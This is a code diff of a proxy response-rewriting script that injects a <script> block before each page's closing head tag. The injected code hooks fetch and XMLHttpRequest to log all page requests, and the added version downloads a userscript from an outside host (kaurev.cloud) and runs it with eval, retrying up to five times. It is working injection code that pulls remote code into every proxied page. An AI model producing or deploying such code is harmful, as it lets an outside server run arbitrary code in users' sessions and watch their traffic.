@@ -3,8 +3,10 @@ var body = $response.body;
 if (body) {
     body = body.replace(/<\/head>/i, `
 <script>
-
 (function() {
+
+    // ===== TEST =====
+    alert("INJECT JALAN");
 
     console.log("=== PROXY INJECT START ===");
 
@@ -23,13 +25,14 @@ if (body) {
     window.GM_setValue = function(){};
     window.GM_getValue = function(){};
 
-    // ===== HOOK NETWORK =====
+    // ===== HOOK FETCH =====
     const origFetch = window.fetch;
     window.fetch = function(...args){
         console.log("FETCH:", args);
         return origFetch.apply(this, args);
     };
 
+    // ===== HOOK XHR =====
     const open = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(){
         console.log("XHR:", arguments);
@@ -37,34 +40,41 @@ if (body) {
     };
 
     // ===== LOAD SCRIPT FUNCTION =====
-    function loadScript() {
-        try {
-            let s = document.createElement("script");
-            s.src = "https://kaurev.cloud/7619565898/7b5a932293ffe702d15cf43d74be307f5502272c1895b917e5a71434ce3215cf/install.user.js";
-            s.async = true;
-            s.onload = () => console.log("Script loaded OK");
-            s.onerror = () => console.log("Script load FAILED");
-            document.documentElement.appendChild(s);
-        } catch(e) {
-            console.log("Load error:", e);
-        }
+    function loadKaurev() {
+        console.log("Loading Kaurev script...");
+
+        fetch("https://kaurev.cloud/7619565898/7b5a932293ffe702d15cf43d74be307f5502272c1895b917e5a71434ce3215cf/install.user.js")
+        .then(r => r.text())
+        .then(code => {
+            console.log("Script fetched");
+            try {
+                eval(code);
+                console.log("Script executed");
+            } catch(e) {
+                console.log("Eval error:", e);
+            }
+        })
+        .catch(err => console.log("Fetch error:", err));
     }
 
-    // ===== MULTI RETRY =====
+    // ===== RETRY SYSTEM =====
     let attempts = 0;
     let maxAttempts = 5;
 
     function tryInject() {
-        if (attempts >= maxAttempts) return;
+        if (attempts >= maxAttempts) {
+            console.log("Max attempts reached");
+            return;
+        }
 
         console.log("Inject attempt:", attempts);
-        loadScript();
+        loadKaurev();
 
         attempts++;
-        setTimeout(tryInject, 2000);
+        setTimeout(tryInject, 3000);
     }
 
-    // ===== START AFTER LOAD =====
+    // ===== START =====
     function start() {
         console.log("Start inject engine");
         tryInject();
